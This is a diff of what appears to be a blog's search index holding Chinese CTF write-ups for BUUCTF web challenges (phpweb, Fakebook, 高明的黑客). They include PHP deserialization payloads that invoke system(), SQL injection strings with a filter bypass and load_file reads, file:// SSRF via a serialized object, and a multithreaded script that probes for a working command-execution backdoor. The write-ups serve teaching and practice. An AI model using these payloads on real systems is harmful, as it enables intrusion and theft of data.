-<p>进入环境，会发现5秒后自动跳转到 index.php 页面，并且之后每5秒刷新一次，查看源码，发现应该是如下函数： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(&quot;document.form1.submit()&quot;,5000)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230357.png" /></p>
-<p>这不是重点，接着我们抓包</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230244.png" /></p>
-<p>发现 POST 提交了两个参数 <code>func</code> 和 <code>p</code> 。结合上面的表单消息推测，<code>func</code> 应该是函数的意思，而 <code>p</code> 应该是一个参数。（上面表单中的<code>p</code> 是时间的格式，可能是参数）</p>
+<p>进入环境，得到如下信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
+<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
+<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
 <h1 id="解题">解题</h1>
-<p>将函数随便改一个试试看（这里 echo 并不是函数，主要想看看报错的信息）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230721.png" /></p>
-<p>注意 <code>call_user_func()</code>，这函数的作用简而言之就是调用一个PHP函数，可以带入参数，语法如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure></p>
-<p>更多信息请参考：<a href="https://www.php.net/manual/zh/function.call-user-func.php">PHP_call_user_func</a></p>
-<p>因此，我们尝试用 <code>file_get_contents()</code> 读取一下 <code>index.php</code> 的内容</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327231040.png" /></p>
-<p>将代码整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里<code>get time</code> 中的 <code>call_user_func()</code> 函数能够调用的函数被禁了好多，但是这不是重点，重点是 <code>Test</code> 类里面的 <code>__destruct</code> ，这个也可以调用 <code>call_user_func()</code> 而且是不经过验证。因此思路就是构造序列化字符串作为 POST 提交的 <code>p</code> ，而POST 提交的 <code>func</code> 则为 <code>unserialize</code>。</p>
-<p>接下来构造 <code>p</code> （这里的p指的是POST提交的，而不是类中的）</p>
-<blockquote>
-<p>这里类中的 var 其实是 public 的别名</p>
-</blockquote>
-<p>编写简单的PHP脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;参数&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>参数依次如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls / # 查看根目录</span><br><span class="line">2. ls   # 查看当前目录</span><br><span class="line">3. find / -name flag* # 找flag文件路径，这里会找到很多，但是其他的一看就不像</span><br><span class="line">4. cat /tmp/flagoefiu4r93 # 读取flag</span><br></pre></td></tr></table></figure></p>
-<p>将上面参数带入PHP脚本，然后执行得到的字符串作为 POST 提交的 p。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232126.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232212.png" /></p>
+<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
+<p>最终结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
+<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
+<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
 <h1 id="总结">总结</h1>
-<p>本题难度并不大，主要的难点就在于报错提示的 <code>call_user_func()</code> ，要明白它的作用。本题考的其实是PHP知识点，熟悉PHP中的函数尤其是调用系统的命令的函数以及反序列化知识点。前者其实可以在 <strong>命令执行</strong> 相关题目中积累。</p>
+<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
-        <tag>反序列化</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -1336,6 +1297,104 @@
       <tags>
         <tag>综合</tag>
         <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯 2018 Fakebook</title>
+    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
+<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
+<h1 id="第一次sql注入">第一次sql注入</h1>
+<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
+<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
+<h2 id="获取字段数">获取字段数</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
+<h2 id="测试显示位">测试显示位</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
+<p>上面的信息很丰富：</p>
+<ul>
+<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
+<li>显示位为 2</li>
+<li>地址为：<strong>/var/www/html/view.php</strong></li>
+</ul>
+<h2 id="常规注入">常规注入</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
+<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
+<h1 id="信息收集">信息收集</h1>
+<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
+<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>（这里也说明，blog是有特殊的格式要求的。）</p>
+<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
+<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
+<h1 id="第二次sql注入">第二次sql注入</h1>
+<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
+<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
+<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
+<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
+<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
+<h1 id="其他注入方法">其他注入方法</h1>
+<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
+<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯 2020 朱雀组 phpweb</title>
+    <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
+    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，会发现5秒后自动跳转到 index.php 页面，并且之后每5秒刷新一次，查看源码，发现应该是如下函数： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(&quot;document.form1.submit()&quot;,5000)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230357.png" /></p>
+<p>这不是重点，接着我们抓包</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230244.png" /></p>
+<p>发现 POST 提交了两个参数 <code>func</code> 和 <code>p</code> 。结合上面的表单消息推测，<code>func</code> 应该是函数的意思，而 <code>p</code> 应该是一个参数。（上面表单中的<code>p</code> 是时间的格式，可能是参数）</p>
+<h1 id="解题">解题</h1>
+<p>将函数随便改一个试试看（这里 echo 并不是函数，主要想看看报错的信息）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230721.png" /></p>
+<p>注意 <code>call_user_func()</code>，这函数的作用简而言之就是调用一个PHP函数，可以带入参数，语法如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure></p>
+<p>更多信息请参考：<a href="https://www.php.net/manual/zh/function.call-user-func.php">PHP_call_user_func</a></p>
+<p>因此，我们尝试用 <code>file_get_contents()</code> 读取一下 <code>index.php</code> 的内容</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327231040.png" /></p>
+<p>将代码整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span 